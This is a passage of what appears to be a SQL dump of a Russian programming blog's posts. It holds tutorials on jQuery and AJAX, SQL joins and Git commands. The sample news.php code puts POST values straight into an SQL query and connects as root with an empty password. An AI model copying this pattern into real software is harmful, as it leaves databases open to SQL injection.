charset=&quot;UTF-8&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;title&gt;Веб-проект&lt;/title&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;!--Подключение данных файла jquery-2.2.3.min.js в каталоге js --&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;script src=&quot;js/jquery-2.2.3.min.js&quot;&gt;&lt;/script&gt;<br />\r\n&lt;/head&gt;<br />\r\n&lt;body&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\n<br />\r\n<span style="background-color:rgb(255, 255, 0)">2. Способ второй.</span><br />\r\n&nbsp;&nbsp; Сделать обращение к библиотеки удаленной с JQuery</p>\r\n\r\n<blockquote>\r\n<p><br />\r\n&lt;!DOCTYPE html&gt;<br />\r\n&lt;html lang=&quot;en&quot;&gt;<br />\r\n&nbsp;&nbsp; &lt;head&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;meta charset=&quot;UTF-8&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;title&gt;Веб-проект&lt;/title&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;!--Подключаем файл удаленный по нижеуказанному адресу--&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js&quot;&gt;&lt;/script&gt;<br />\r\n&nbsp;&nbsp; &lt;/head&gt;<br />\r\n&nbsp;&nbsp; &lt;body&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp; &lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\nНа самом деле подключить скрипты можно в любой части кода HTML, хоть в футере, хоть в теге head.<br />\r\nДругое дело, что если вы подключите в неправильном порядке библиотеки, то они могут неправильно работать, и выдавать ошибки кода на уровне frond-end контента. В консоли браузера такие ошибки протоколируются, и легко можно увидеть нарушения в формировании контента страницы.<br />\r\n<br />\r\nПосле того, как правильно подключена библиотека JQuery, можно делать обращения к html-документу:</p>\r\n\r\n<blockquote>\r\n<p>&lt;code&gt;<br />\r\n$(document).ready(function(){<br />\r\n//Здесь пишется код<br />\r\n});&lt;/code&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\nНапример, вот такой код:</p>\r\n\r\n<blockquote>\r\n<p>&lt;code&gt;<br />\r\n$(document).ready(function(){<br />\r\n&nbsp;&nbsp; $(&quot;#form_button&quot;).click(function(){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; console.log(&#39;В консоль браузера выведется текст! Кнопка с именем form_button нажата!&#39;);<br />\r\n&nbsp;&nbsp; })<br />\r\n});&lt;/code&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\n<span style="background-color:rgb(255, 255, 0)">Техонология Ajax</span>&nbsp;- Asynchronous JavaScript And XML (Асинхронный JavaScript и XML).<br />\r\nЧтобы написать ajax запрос через обертки JQuery, выполняем следующий код:</p>\r\n\r\n<blockquote>\r\n<p>&lt;code&gt;<br />\r\n$.ajax({<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp; type: &#39;POST&#39;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp; url: &#39;news.php&#39;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp; data: &#39;category=Global&amp;dateNew=2018-10-10&#39;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp; success: function(data){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; $(&#39;.divnews&#39;).html(data);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; &nbsp;}); &lt;/code&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\nНапример, вот такой запрос, где:<br />\r\ntype - означает метод передачи данных (POST, либо GET).<br />\r\nurl - адрес страницы на которой будет выполняться ajax запрос.<br />\r\ndata - данные, которые будут переданы на страница news.php в формате POST-данных<br />\r\nsuccess - ответные данные от страницы news.php на которой будут выполнены определенные программные операции.<br />\r\n<br />\r\nВсе такие данные загружаются в блок класса divnews.<br />\r\n<br />\r\nНа странице news.php может быть примерно такой код:</p>\r\n\r\n<blockquote>\r\n<p><br />\r\n&lt;code class=&quot;code123&quot;&gt;<br />\r\n&lt;?<br />\r\n// Считывание данных из ajax-запроса:<br />\r\n<br />\r\n$category = $_POST[&#39;category&#39;];<br />\r\n$dateNew = $_POST[&#39;dateNew&#39;];<br />\r\n<br />\r\n// Коннект с базой данных через расширение mysqli для работы с базами данных:<br />\r\n<br />\r\n$connect = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;&quot;, &quot;manager&quot;);<br />\r\n// читаем новости из базы данных категории Global на дату 10.10.2018<br />\r\n$result = $connect-&gt;query(&quot;select * from BD_News where ((category = &#39;&quot;.$category .&quot;&#39;) &amp;&amp; (dateNew = &#39;&quot;.$dateNew.&quot;&#39;))&quot;);<br />\r\n$row = $result-&gt;fetch_object();<br />\r\n&nbsp;<br />\r\n// отправляем все данные в формате JSON&nbsp; обратно нашему основному скрипту, где был вызван метод ajax (index.php)<br />\r\n//формат JSON выглядит так:<br />\r\n// &quot;ключ1&quot;:&quot;значени1&quot;, &quot;ключ2&quot;:&quot;значени2&quot; и т.д.<br />\r\n&nbsp; echo &#39;{&quot;new_id&quot;:&quot;&#39;.$row-&gt;new_id.&#39;&quot;,<br />\r\n&nbsp;&quot;new_title&quot;:&quot;&#39;.$row-&gt;new_title.&#39;&quot;,<br />\r\n&nbsp;&quot;new_text&quot;:&quot;&#39;.$row-&gt;new_text.&#39;&quot;,<br />\r\n&nbsp;&quot;new_author&quot;:&quot;&#39;.$row-&gt;new_author.&#39;&quot;}&#39;;<br />\r\n?&gt;<br />\r\n&lt;/code&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\nСобственно вот так вкратце рассказал о работе с js и JQuery.</p>\r\n', '2022-09-14 13:55:43', '2022-09-14 13:55:43', 'Admin', 'ea825c8985bf9f4553b8.jpg', 0, 0),
	(19, 'РАБОТА С JS И JQUERY', 'В программировании часто приходится писать скрипты, как стороне сервера, так и на стороне клиента.\r\nНа стороне клиента скрипты обрабатываются в форме js скриптов. Иногда такие скрипты оборачиваются в дополнительные js-фреймворки, такие как JQuery. JQuery - современный js-фреймворк для обработки событий в браузере, а также создания, анимации, особенностей frond-end программирования.\r\n\r\nСамо выполнение скрипта выполняется в обрамлениях тега: <script></script> Соответственно, чтобы вызвать чистый js, либо JQuery, нужно делать обращения через подобные обертки В параметре src пишется адрес подключения библиотеки, которая будет подключена к скрипту. Без параметра src тег <script></script> подразумевает выполнение кода frond-end контекта.', '<p style="text-align:justify">В программировании часто приходится писать скрипты, как стороне сервера, так и на стороне клиента.<br />\r\nНа стороне клиента скрипты обрабатываются в форме js скриптов. Иногда такие скрипты оборачиваются в дополнительные js-фреймворки, такие как JQuery. JQuery - современный js-фреймворк для обработки событий в браузере, а также создания, анимации, особенностей frond-end программирования.<br />\r\n<br />\r\nСамо выполнение скрипта выполняется в обрамлениях тега: &lt;script&gt;&lt;/script&gt; Соответственно, чтобы вызвать чистый js, либо JQuery, нужно делать обращения через подобные обертки В параметре src пишется адрес подключения библиотеки, которая будет подключена к скрипту. Без параметра src тег&nbsp;<span style="background-color:rgb(255, 255, 0)">&lt;script&gt;&lt;/script&gt;</span>&nbsp;подразумевает выполнение кода frond-end контекта.<br />\r\n<br />\r\nВот как выполняется&nbsp;<span style="background-color:rgb(255, 255, 0)">обращение к js-скрипту</span>:</p>\r\n\r\n<blockquote>\r\n<p><br />\r\n&lt;html&gt;<br />\r\n&lt;body&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;h1&gt;Скрипт&lt;/h1&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;script type=&quot;text/javascript&quot;&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; alert(&quot;Выполнение скрипта js осуществлено!&quot;)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;/script&gt;<br />\r\n&nbsp;&nbsp;&nbsp; &lt;h1&gt;Тест страница&lt;/h1&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\nЧтобы&nbsp;<span style="background-color:rgb(255, 255, 0)">подключить JQuery библиотеку</span>, нужно выполнить один из способов подключения:<br />\r\n<br />\r\n<span style="background-color:rgb(255, 255, 0)">1. Способ первый.</span><br />\r\n&nbsp;&nbsp; Скачать локально библиотеку JQuery и кинуть ее в каталог веб-проекта, после чего подключить:</p>\r\n\r\n<blockquote>\r\n<p><br />\r\n&lt;!DOCTYPE html&gt;<br />\r\n&lt;html lang=&quot;en&quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;meta charset=&quot;UTF-8&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;title&gt;Веб-проект&lt;/title&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;!--Подключение данных файла jquery-2.2.3.min.js в каталоге js --&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;script src=&quot;js/jquery-2.2.3.min.js&quot;&gt;&lt;/script&gt;<br />\r\n&lt;/head&gt;<br />\r\n&lt;body&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\n<br />\r\n<span style="background-color:rgb(255, 255, 0)">2. Способ второй.</span><br />\r\n&nbsp;&nbsp; Сделать обращение к библиотеки удаленной с JQuery</p>\r\n\r\n<blockquote>\r\n<p><br />\r\n&lt;!DOCTYPE html&gt;<br />\r\n&lt;html lang=&quot;en&quot;&gt;<br />\r\n&nbsp;&nbsp; &lt;head&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;meta charset=&quot;UTF-8&quot;&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;title&gt;Веб-проект&lt;/title&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;!--Подключаем файл удаленный по нижеуказанному адресу--&gt;<br />\r\n&nbsp;&nbsp; &nbsp;&lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js&quot;&gt;&lt;/script&gt;<br />\r\n&nbsp;&nbsp; &lt;/head&gt;<br />\r\n&nbsp;&nbsp; &lt;body&gt;&nbsp;&nbsp; &nbsp;<br />\r\n&nbsp;&nbsp; &lt;/body&gt;<br />\r\n&lt;/html&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\nНа самом деле подключить скрипты можно в любой части кода HTML, хоть в футере, хоть в теге head.<br />\r\nДругое дело, что если вы подключите в неправильном порядке библиотеки, то они могут неправильно работать, и выдавать ошибки кода на уровне frond-end контента. В консоли браузера такие ошибки протоколируются, и легко можно увидеть нарушения в формировании контента страницы.<br />\r\n<br />\r\nПосле того, как правильно подключена библиотека JQuery, можно делать обращения к html-документу:</p>\r\n\r\n<blockquote>\r\n<p>&lt;code&gt;<br />\r\n$(document).ready(function(){<br />\r\n//Здесь пишется код<br />\r\n});&lt;/code&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\nНапример, вот такой код:</p>\r\n\r\n<blockquote>\r\n<p>&lt;code&gt;<br />\r\n$(document).ready(function(){<br />\r\n&nbsp;&nbsp; $(&quot;#form_button&quot;).click(function(){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; console.log(&#39;В консоль браузера выведется текст! Кнопка с именем form_button нажата!&#39;);<br />\r\n&nbsp;&nbsp; })<br />\r\n});&lt;/code&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\n<span style="background-color:rgb(255, 255, 0)">Техонология Ajax</span>&nbsp;- Asynchronous JavaScript And XML (Асинхронный JavaScript и XML).<br />\r\nЧтобы написать ajax запрос через обертки JQuery, выполняем следующий код:</p>\r\n\r\n<blockquote>\r\n<p>&lt;code&gt;<br />\r\n$.ajax({<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp; type: &#39;POST&#39;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp; url: &#39;news.php&#39;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp; data: &#39;category=Global&amp;dateNew=2018-10-10&#39;,<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp; success: function(data){<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp; $(&#39;.divnews&#39;).html(data);<br />\r\n&nbsp;&nbsp; &nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; &nbsp;}); &lt;/code&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\nНапример, вот такой запрос, где:<br />\r\ntype - означает метод передачи данных (POST, либо GET).<br />\r\nurl - адрес страницы на которой будет выполняться ajax запрос.<br />\r\ndata - данные, которые будут переданы на страница news.php в формате POST-данных<br />\r\nsuccess - ответные данные от страницы news.php на которой будут выполнены определенные программные операции.<br />\r\n<br />\r\nВсе такие данные загружаются в блок класса divnews.<br />\r\n<br />\r\nНа странице news.php может быть примерно такой код:</p>\r\n\r\n<blockquote>\r\n<p><br />\r\n&lt;code class=&quot;code123&quot;&gt;<br />\r\n&lt;?<br />\r\n// Считывание данных из ajax-запроса:<br />\r\n<br />\r\n$category = $_POST[&#39;category&#39;];<br />\r\n$dateNew = $_POST[&#39;dateNew&#39;];<br />\r\n<br />\r\n// Коннект с базой данных через расширение mysqli для работы с базами данных:<br />\r\n<br />\r\n$connect = new mysqli(&quot;localhost&quot;, &quot;root&quot;, &quot;&quot;, &quot;manager&quot;);<br />\r\n// читаем новости из базы данных категории Global на дату 10.10.2018<br />\r\n$result = $connect-&gt;query(&quot;select * from BD_News where ((category = &#39;&quot;.$category .&quot;&#39;) &amp;&amp; (dateNew = &#39;&quot;.$dateNew.&quot;&#39;))&quot;);<br />\r\n$row = $result-&gt;fetch_object();<br />\r\n&nbsp;<br />\r\n// отправляем все данные в формате JSON&nbsp; обратно нашему основному скрипту, где был вызван метод ajax (index.php)<br />\r\n//формат JSON выглядит так:<br />\r\n// &quot;ключ1&quot;:&quot;значени1&quot;, &quot;ключ2&quot;:&quot;значени2&quot; и т.д.<br />\r\n&nbsp; echo &#39;{&quot;new_id&quot;:&quot;&#39;.$row-&gt;new_id.&#39;&quot;,<br />\r\n&nbsp;&quot;new_title&quot;:&quot;&#39;.$row-&gt;new_title.&#39;&quot;,<br />\r\n&nbsp;&quot;new_text&quot;:&quot;&#39;.$row-&gt;new_text.&#39;&quot;,<br />\r\n&nbsp;&quot;new_author&quot;:&quot;&#39;.$row-&gt;new_author.&#39;&quot;}&#39;;<br />\r\n?&gt;<br />\r\n&lt;/code&gt;</p>\r\n</blockquote>\r\n\r\n<p style="text-align:justify"><br />\r\nСобственно вот так вкратце рассказал о работе с js и JQuery.</p>\r\n', '2022-09-14 13:55:44', '2022-09-21 16:32:45', 'Admin', 'cf22c2c2e0a52c66d493.jpg', 0, 4),
	(20, 'ВИДЫ JOIN В SQL', 'Одно из важных способностей языка запросов SQL это определение связей между множеством таблиц и отображение их информации в рамках единственной команды. Операция такого рода называется соединением SQL или соединение таблиц. Наличие операции соединения SQL является главным отличием реляционной базы данных от других.', '<p style="text-align:justify">Одно из важных способностей языка запросов SQL это определение связей между множеством таблиц и отображение их информации в рамках единственной команды. Операция такого рода называется соединением SQL или соединение таблиц. Наличие операции соединения SQL является главным отличием реляционной базы данных от других.</p>\r\n\r\n<p style="text-align:center"><img alt="" src="/yii2blog/files/join-type.png" style="border:0px; box-sizing:border-box; height:518px; vertical-align:middle; width:700px" /></p>\r\n\r\n<p style="text-align:justify">&nbsp;</p>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9); position: absolute; left: -1000px; top: 90px; width: 1px; height: 1px; overflow: hidden;">По синтаксису языка:</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9); position: absolute; left: -1000px; top: 90px; width: 1px; height: 1px; overflow: hidden;">&nbsp;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9); position: absolute; left: -1000px; top: 90px; width: 1px; height: 1px; overflow: hidden;">Соединения таблицы перечисляются в предложении запроса FROM;</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9); position: absolute; left: -1000px; top: 90px; width: 1px; height: 1px; overflow: hidden;">Имена таблиц разделяются запятыми.</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9); position: absolute; left: -1000px; top: 90px; width: 1px; height: 1px; overflow: hidden;">Предикат запроса может ссылаться на любой столбец любой из соединяемых таблиц и, следовательно, может использоваться для установления связей между ними.</div>\r\n\r\n<div id="cke_pastebin" style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9); position: absolute; left: -1000px; top: 90px; width: 1px; height: 1px; overflow: hidden;">Обычно предикат сравнивает значения в столбцах различных таблиц для того, чтобы определить, удовлетворяется ли условие WHERE.По синтаксису языка:</div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Соединения таблицы перечисляются в предложении запроса FROM;</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Имена таблиц разделяются запятыми.&nbsp;</span><span style="font-size:18px">Предикат запроса может ссылаться на любой столбец любой из соединяемых таблиц и, следовательно, может использоваться для установления связей между ними.&nbsp;</span><span style="font-size:18px">Обычно предикат сравнивает значения в столбцах различных таблиц для того, чтобы определить, удовлетворяется ли условие WHERE.</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">&nbsp;</div>\r\n\r\n<p>&nbsp;</p>\r\n', '2022-09-14 13:58:35', '2022-09-14 13:59:50', 'Admin', 'c96de3ce8c5c3ffe73a8.png', 0, 0),
	(21, 'GIT КОМАНДЫ И GITHUB', 'Git — это распределенная система контроля версий нашего кода. Для распределенных команд нужна какая-то система управления работы. Нужна, чтобы отслеживать изменения, которые происходят со временем. Все изменения фиксируются и отмечаются в реестре гита. \r\n\r\nНАИБОЛЕЕ ВАЖНЫЕ КОМАНДЫ GIT\r\nПЕРВОНАЧАЛЬНАЯ НАСТРОЙКА', '<p style="text-align:justify">Git &mdash; это распределенная система контроля версий нашего кода. Для распределенных команд нужна какая-то система управления работы. Нужна, чтобы отслеживать изменения, которые происходят со временем. Все изменения фиксируются и отмечаются в реестре гита.&nbsp;</p>\r\n\r\n<h1 style="text-align:justify">НАИБОЛЕЕ ВАЖНЫЕ КОМАНДЫ GIT</h1>\r\n\r\n<h2 style="text-align:justify">ПЕРВОНАЧАЛЬНАЯ НАСТРОЙКА</h2>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Настройка информации о пользователе для всех локальных репозиториев</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git config --global user.name &quot;[имя]&quot;</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Устанавливает имя, которое будет отображаться в поле автора у выполняемых вами коммитов</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git config --global user.email &quot;[адрес электронной почты]&quot;</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Устанавливает адрес электронной почты, который будет отображаться в информации о выполняемых вами коммитах.</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">&nbsp;</div>\r\n\r\n<h2 style="text-align:justify">СОЗДАНИЕ РЕПОЗИТОРИЯ</h2>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Создание нового репозитория или получение его по существующему URL-адресу</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git init [название проекта]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Создаёт новый локальный репозиторий с заданным именем</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git clone [url-адрес]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Скачивает репозиторий вместе со всей его историей изменений.</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">&nbsp;</div>\r\n\r\n<h2 style="text-align:justify">ВНЕСЕНИЕ ИЗМЕНЕНИЙ</h2>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git status</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Перечисляет все новые или изменённые файлы, которые нуждаются в фиксации</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git diff</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Показывает различия по внесённым изменениям в ещё не проиндексированных файлах</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git add [файл]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Индексирует указанный файл для последующего коммита</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git diff --staged</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Показывает различия между проиндексированной и последней зафиксированной версиями файлов</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git reset [файл]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Отменяет индексацию указанного файла, при этом сохраняет его содержимое</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git commit -m &quot;[сообщение с описанием]&quot;</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Фиксирует проиндексированные изменения и сохраняет их в историю версий.</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">&nbsp;</div>\r\n\r\n<h2 style="text-align:justify">КОЛЛЕКТИВНАЯ РАБОТА</h2>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git branch</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Список именованных веток коммитов с указанием выбранной ветки</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git branch [имя ветки]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Создаёт новую ветку</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git checkout -b [имя ветки]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Переключается на выбранную ветку и обновляет рабочую директорию до её состояния</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git merge [имя ветки]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Вносит изменения указанной ветки в текущую ветку</span></div>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git branch -d [имя ветки]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);"><span style="font-size:18px">Удаляет выбранную ветку.</span></div>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: &quot;Open Sans&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif; font-size: 14px; text-align: justify; background-color: rgba(255, 255, 255, 0.9);">&nbsp;</div>\r\n\r\n<h2 style="text-align:justify">ОТКАТ КОММИТОВ</h2>\r\n\r\n<blockquote>\r\n<div style="box-sizing: border-box;">$ git reset [коммит]</div>\r\n</blockquote>\r\n\r\n<div style="box-sizing: border-box; color: rgb(51, 51, 51); font-family: 